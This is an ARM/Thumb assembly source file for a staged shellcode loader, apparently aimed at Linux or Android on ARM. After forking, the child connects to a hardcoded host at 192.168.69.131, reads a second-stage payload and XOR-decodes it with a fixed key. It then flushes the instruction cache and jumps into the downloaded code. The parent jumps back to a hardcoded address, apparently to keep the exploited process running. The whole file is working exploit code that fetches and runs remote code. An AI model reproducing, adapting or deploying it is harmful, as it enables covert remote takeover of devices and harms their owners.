.globl _start
_start:
	.code 32	
        add     r1, pc, #1
        bx      r1

	
        .code 16

	/* fork */
	nop
	mov	r7, #2
	svc	1

	cmp	r0, #0     /* child is 0 */
	beq	child

	/* parent only coe */
	/* fix r5, r6, sp  */
	
	mov	r0, #0
	mov	r1, sp
	sub	r1, r1, #80
	mov	sp, r1
	mov	r1, r8
	mov	r6, sp

	mov	sp, r8
	add     sp, sp, #56
	
	adr	r3, end_loop
	ldr	r3, [r3]
	bx	r3
	
	

	/* child only */
child:

	/* 1] open socket */
	nop	
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25 	/* socket(2, 1, 0) */
        svc     1

	cmp	r0, #0
	blt	exit
	
	/* 2] connect */
connect:mov     r6, r0	          /* r6 contains socket descriptor */
        adr     r1, sockaddr_dl   /* r1 points to sockaddr */
        mov     r2, #16
        add     r7, #2	          /* socket + 2 = 283 */
        svc     1	          /* connect(r0, &addr, 16) */

	cmp	r0, #0
	blt	exit

	/* 5] read-write loop  */

	mov	r9, r6		/* from now on sockfd is r9 */
	
	
read:	adr	r2, buffer_size	/* size per read, assuming the whole 3rd stage is read with a single read */
	ldrh	r2, [r2]
	mov	r5, pc
	adr	r5, buffer      /* r5 is ptr to buffer */
	mov	r1, r5
	mov	r0, r9          /* sockfd */
	mov	r7, #3
	svc	1		/* read(int fd, void *buf, size_t count) */

	mov	r12, r0
	cmp	r0, #0
	blt	exit
	

setup:	adr	r1, key
	ldr	r1, [r1]	/* r1 holds the key */
	mov	r2, r5		/* r2 is ptr to buffer */

	mov	r3, #0		/* r3 holds number of bytes xored */
	
xor:	
	ldr	r0, [r2]
	eor	r0, r0, r1
	str	r0, [r2]
	
	add 	r3, r3, #4
	add	r2, r2, #4
	cmp	r3, r12
	blt	xor	

	adr     r3, flush
        bx      r3
	nop
	nop
	
        .code 32

	/* fork */
	mov	r8, r8
	
flush:	adr	r0, buffer
	adr	r1, buffer
	add	r1, #400
	mov	r2, #0
	mov	r7, #983040
	add	r7, #2
	svc	1
	
	
	adr	r3, buffer
	add	r3, #1
	bx	r3

	
	.code 16
exit:
	/* exit for generic error handling */
	mov	r7, #1
	svc	1
		
sockaddr_dl:	
		.align 2	               /* struct sockaddr */
 		.short 0x2	
		.short 0x3412
		.byte 192,168,69,131	

end_loop:	.word  0xa84dbc37

key:		.word 0x01234567
	
buffer_size:	.short 0x400
		.byte  1,1

buffer:		.byte 3,3,3,3
